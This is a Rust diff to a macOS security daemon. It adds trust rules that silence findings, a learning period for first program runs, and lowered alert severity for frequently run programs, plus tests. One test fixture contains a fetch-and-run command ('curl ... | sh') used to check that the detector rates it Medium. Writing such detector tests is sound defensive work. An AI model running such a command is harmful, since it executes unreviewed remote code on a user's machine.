@@ -5,8 +5,10 @@ use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
 use std::collections::{BTreeSet, HashMap};
 
+use vogter_detect::trust::{Subject, is_trusted, subject_for};
 use vogter_ipc::{Event, Message, PROTOCOL_VERSION, Realtime, Request, Status};
-use vogter_model::{Activity, ActivityKind, AvState, Severity};
+use vogter_model::{Activity, ActivityKind, AvState, ExecInfo, Severity, SignatureKind, TrustRule};
+use vogter_sensors::hash::sha256_file;
 
 use crate::watch::Signal;
 use vogter_store::Store;
@@ -18,6 +20,8 @@ pub struct Daemon {
     subscribers: Mutex<Vec<Sender<Message>>>,
     scan_tx: Mutex<Sender<()>>,
     away: Mutex<Away>,
+    /// Cached copy of the trust table.
+    trust: Mutex<Vec<TrustRule>>,
     realtime: Mutex<Realtime>,
     interval: Duration,
     as_root: bool,
@@ -34,6 +38,11 @@ struct Away {
 
 /// The same activity (summary + path) is reported at most once in this window.
 const REPEAT_WINDOW_SECS: u64 = 600;
+/// First runs of programs are learned silently for this long after install.
+const LEARNING_SECS: u64 = 7 * 86_400;
+/// A program this familiar gets its low/medium alerts one level lower.
+const FAMILIAR_RUNS: u64 = 20;
+const FAMILIAR_SECS: u64 = 3 * 86_400;
 /// Locks shorter than this don't get a summary.
 const AWAY_MIN_SECS: u64 = 60;
 
@@ -62,10 +71,11 @@ fn lock<T>(m: &Mutex<T>) -> MutexGuard<'_, T> {
 impl Daemon {
     pub fn new(store: Store, interval: Duration, as_root: bool, scan_tx: Sender<()>) -> Self {
         Daemon {
-            store: Mutex::new(store),
             live: Mutex::default(),
             subscribers: Mutex::default(),
             scan_tx: Mutex::new(scan_tx),
+            trust: Mutex::new(store.trust_rules().unwrap_or_default()),
+            store: Mutex::new(store),
             away: Mutex::default(),
             realtime: Mutex::default(),
             interval,
@@ -114,6 +124,32 @@ impl Daemon {
                 return Message::Ok;
             }
             Request::Subscribe => unreachable!("handled by the connection"),
+            Request::Trust {
+                finding_key,
+                event_id,
+                all_checks,
+            } => return self.trust(finding_key, event_id, all_checks),
+            Request::TrustRules => {
+                return Message::TrustRules {
+                    rules: lock(&self.trust).clone(),
+                };
+            }
+            Request::Untrust { id } => {
+                let removed = lock(&self.store).remove_trust(id);
+                return match removed {
+                    Ok(true) => {
+                        lock(&self.trust).retain(|r| r.id != id);
+                        let _ = lock(&self.scan_tx).send(());
+                        Message::Ok
+                    }
+                    Ok(false) => Message::Error {
+                        message: format!("no trust rule {id}"),
+                    },
+                    Err(e) => Message::Error {
+                        message: e.to_string(),
+                    },
+                };
+            }
         };
         result.unwrap_or_else(|e| Message::Error {
             message: e.to_string(),
@@ -138,6 +174,8 @@ impl Daemon {
             av: live.av.clone(),
             sensor_errors: live.sensor_errors.clone(),
             realtime: lock(&self.realtime).clone(),
+            learning_until: store.created_at().unwrap_or(0) + LEARNING_SECS,
+            trust_rules: lock(&self.trust).len() as u32,
         }
     }
 
@@ -158,7 +196,7 @@ impl Daemon {
                     if !exec.signing.is_apple() && lock(&self.away).locked_at.is_some() {
                         lock(&self.away).programs.insert(exec.name().to_string());
                     }
-                    if let Some(a) = vogter_detect::assess_exec(&exec) {
+                    if let Some(a) = self.assess_exec_with_history(&exec) {
                         let serious = a.severity >= Severity::Medium;
                         self.activity(a, &mut recent);
                         if serious {
@@ -172,7 +210,145 @@ impl Daemon {
         }
     }
 
+    /// The exec rules, adjusted by what we know about this program on this Mac.
+    fn assess_exec_with_history(&self, exec: &ExecInfo) -> Option<Activity> {
+        let assessed = vogter_detect::assess_exec(exec);
+        if exec.signing.is_apple() {
+            return assessed;
+        }
+        let identity = match (&exec.signing.kind, &exec.signing.team_id) {
+            (SignatureKind::ThirdParty, Some(team)) => {
+                format!(
+                    "team:{team}:{}",
+                    exec.signing.identifier.as_deref().unwrap_or("")
+                )
+            }
+            _ => format!("path:{}", exec.path),
+        };
+        let t = now();
+        let store = lock(&self.store);
+        let prior = store.record_program(&identity, exec.name(), t).ok()?;
+        let learning = t < store.created_at().unwrap_or(0) + LEARNING_SECS;
+        drop(store);
+
+        match (assessed, prior) {
+            // Never seen before: worth a note once the learning period is over.
+            (Some(mut a), None) => {
+                if !learning {
+                    a.detail = Some(format!(
+                        "{} (first time this program has run here)",
+                        a.detail.unwrap_or_default()
+                    ));
+                }
+                Some(a)
+            }
+            (None, None) if !learning => {
+                let severity = if exec.signing.is_weak() {
+                    Severity::Low
+                } else {
+                    Severity::Info
+                };
+                Some(
+                    Activity::new(
+                        ActivityKind::ProcessStarted,
+                        severity,
+                        format!("First run of {}", exec.name()),
+                    )
+                    .detail(format!("{} — {}", exec.path, exec.signing.describe()))
+                    .from_exec(exec),
+                )
+            }
+            // Seen many times over days: low/medium alerts are probably routine here.
+            (Some(mut a), Some(h))
+                if matches!(a.severity, Severity::Low | Severity::Medium)
+                    && h.runs >= FAMILIAR_RUNS
+                    && t.saturating_sub(h.first_seen) >= FAMILIAR_SECS =>
+            {
+                a.severity = a.severity.lower();
+                let days = t.saturating_sub(h.first_seen) / 86_400;
+                a.detail = Some(format!(
+                    "{} (lowered: this program has run {} times over {days} days)",
+                    a.detail.unwrap_or_default(),
+                    h.runs
+                ));
+                Some(a)
+            }
+            (a, _) => a,
+        }
+    }
+
+    fn trusted(&self, s: &Subject<'_>) -> bool {
+        is_trusted(s, &lock(&self.trust), &sha256_file)
+    }
+
+    fn trust(
+        &self,
+        finding_key: Option<String>,
+        event_id: Option<i64>,
+        all_checks: bool,
+    ) -> Message {
+        let store = lock(&self.store);
+        let (finding, activity) = match (finding_key, event_id) {
+            (Some(k), _) => match store.finding(&k) {
+                Ok(Some(f)) => (Some(f.finding), None),
+                _ => {
+                    return Message::Error {
+                        message: format!("no finding {k}"),
+                    };
+                }
+            },
+            (None, Some(id)) => match store.event(id) {
+                Ok(Some(e)) => match e.event {
+                    Event::Activity { activity } => (None, Some(activity)),
+                    Event::NewFinding { finding } => (Some(finding.finding), None),
+                    _ => {
+                        return Message::Error {
+                            message: "that event can't be trusted".into(),
+                        };
+                    }
+                },
+                _ => {
+                    return Message::Error {
+                        message: format!("no event {id}"),
+                    };
+                }
+            },
+            (None, None) => {
+                return Message::Error {
+                    message: "give a finding key or an event id".into(),
+                };
+            }
+        };
+        let subject = match (&finding, &activity) {
+            (Some(f), _) => Subject::from(f),
+            (None, Some(a)) => Subject::from(a),
+            (None, None) => unreachable!(),
+        };
+        let (trust_subject, label) = subject_for(&subject, &sha256_file);
+        let check = if all_checks {
+            "*".to_string()
+        } else {
+            vogter_detect::trust::family(&subject.check)
+        };
+        match store.add_trust(&check, &trust_subject, &label, now()) {
+            Ok(rule) => {
+                drop(store);
+                tracing::info!(label = %rule.label, check = %rule.check, "trusted");
+                lock(&self.trust).push(rule.clone());
+                let _ = lock(&self.scan_tx).send(());
+                Message::Trusted { rule }
+            }
+            Err(e) => Message::Error {
+                message: e.to_string(),
+            },
+        }
+    }
+
     fn activity(&self, a: Activity, recent: &mut HashMap<String, u64>) {
+        if self.trusted(&Subject::from(&a)) {
+            tracing::debug!(summary = %a.summary, "trusted activity dropped");
+            return;
+        }
         let t = now();
         let key = format!(
             "{:?}|{}|{}",
@@ -278,7 +454,11 @@ impl Daemon {
         let started = std::time::Instant::now();
         // Sensors run without any lock held; they take about a second.
         let snap = vogter_sensors::snapshot();
-        let findings = vogter_detect::assess(&snap);
+        let (findings, trusted): (Vec<_>, Vec<_>) = vogter_detect::assess(&snap)
+            .into_iter()
+            .partition(|f| !self.trusted(&Subject::from(f)));
+        let trusted_keys: std::collections::HashSet<String> =
+            trusted.iter().map(|f| f.key()).collect();
         let at = now();
         let diff = lock(&self.store).record_scan(at, &findings);
         {
@@ -319,7 +499,10 @@ impl Daemon {
             for f in diff
                 .resolved
                 .into_iter()
-                .filter(|f| f.finding.severity >= EVENT_MIN_SEVERITY)
+                // Trusting something isn't news; it simply stops showing up.
+                .filter(|f| {
+                    f.finding.severity >= EVENT_MIN_SEVERITY && !trusted_keys.contains(&f.key)
+                })
             {
                 self.emit(Event::Resolved {
                     key: f.key,
@@ -527,5 +710,115 @@ mod tests {
             matches!(&ev[0], Event::Activity { activity } if activity.severity == Severity::High),
             "{ev:?}"
         );
+    }
+
+    fn adhoc_exec(path: &str) -> ExecInfo {
+        ExecInfo {
+            pid: 1,
+            ppid: 1,
+            uid: 501,
+            path: path.into(),
+            args: vec![],
+            signing: Signing {
+                kind: SignatureKind::AdHoc,
+                identifier: None,
+                team_id: None,
+                notarized: false,
+            },
+            parent_path: None,
+        }
+    }
+
+    #[test]
+    fn trusting_an_activity_silences_it() {
+        let d = daemon();
+        let mut recent = HashMap::new();
+        let mut a = act(
+            ActivityKind::ProcessStarted,
+            Severity::High,
+            "tool: runs from a temp folder",
+        );
+        a.path = Some("/nonexistent/tool".into());
+        d.activity(a.clone(), &mut recent);
+        let id = lock(&d.store).recent_events(1).unwrap()[0].id;
+
+        let Message::Trusted { rule } = d.trust(None, Some(id), false) else {
+            panic!("not trusted")
+        };
+        // Missing file, no signature: trusted by path, for this check only.
+        assert!(matches!(
+            rule.subject,
+            vogter_model::TrustSubject::File { sha256: None, .. }
+        ));
+        assert_eq!(rule.check, "process");
+
+        recent.clear();
+        d.activity(a, &mut recent);
+        assert_eq!(events(&d).len(), 1, "second occurrence should be dropped");
+
+        assert_eq!(d.handle(Request::Untrust { id: rule.id }), Message::Ok);
+        assert!(lock(&d.trust).is_empty());
+    }
+
+    #[test]
+    fn learning_period_then_first_runs_are_reported() {
+        let d = daemon();
+        // Inside the learning period: an unremarkable program is just recorded.
+        assert!(
+            d.assess_exec_with_history(&adhoc_exec("/opt/tools/a"))
+                .is_none()
+        );
+
+        // Pretend we were installed 8 days ago.
+        lock(&d.store)
+            .conn_for_tests()
+            .execute(
+                "UPDATE meta SET value = ?1 WHERE key = 'created_at'",
+                [(now() - 8 * 86_400).to_string()],
+            )
+            .unwrap();
+        let first = d
+            .assess_exec_with_history(&adhoc_exec("/opt/tools/b"))
+            .unwrap();
+        assert_eq!(
+            (first.severity, first.summary.as_str()),
+            (Severity::Low, "First run of b")
+        );
+        // Second run of the same program: nothing new.
+        assert!(
+            d.assess_exec_with_history(&adhoc_exec("/opt/tools/b"))
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn familiar_programs_get_lower_severity() {
+        let d = daemon();
+        let exec = ExecInfo {
+            args: vec![
+                "bash".into(),
+                "-c".into(),
+                "curl -fsSL https://example.com/x | sh".into(),
+            ],
+            path: "/opt/homebrew/bin/bash".into(),
+            ..adhoc_exec("/x")
+        };
+        let base = vogter_detect::assess_exec(&exec).unwrap().severity;
+        assert_eq!(base, Severity::Medium);
+        {
+            let store = lock(&d.store);
+            for i in 0..25 {
+                store
+                    .record_program(
+                        "path:/opt/homebrew/bin/bash",
+                        "bash",
+                        now() - 5 * 86_400 + i,
+                    )
+                    .unwrap();
+            }
+        }
+        let a = d.assess_exec_with_history(&exec).unwrap();
+        assert_eq!(a.severity, Severity::Low);
+        assert!(a.detail.unwrap().contains("lowered"));
     }
 }
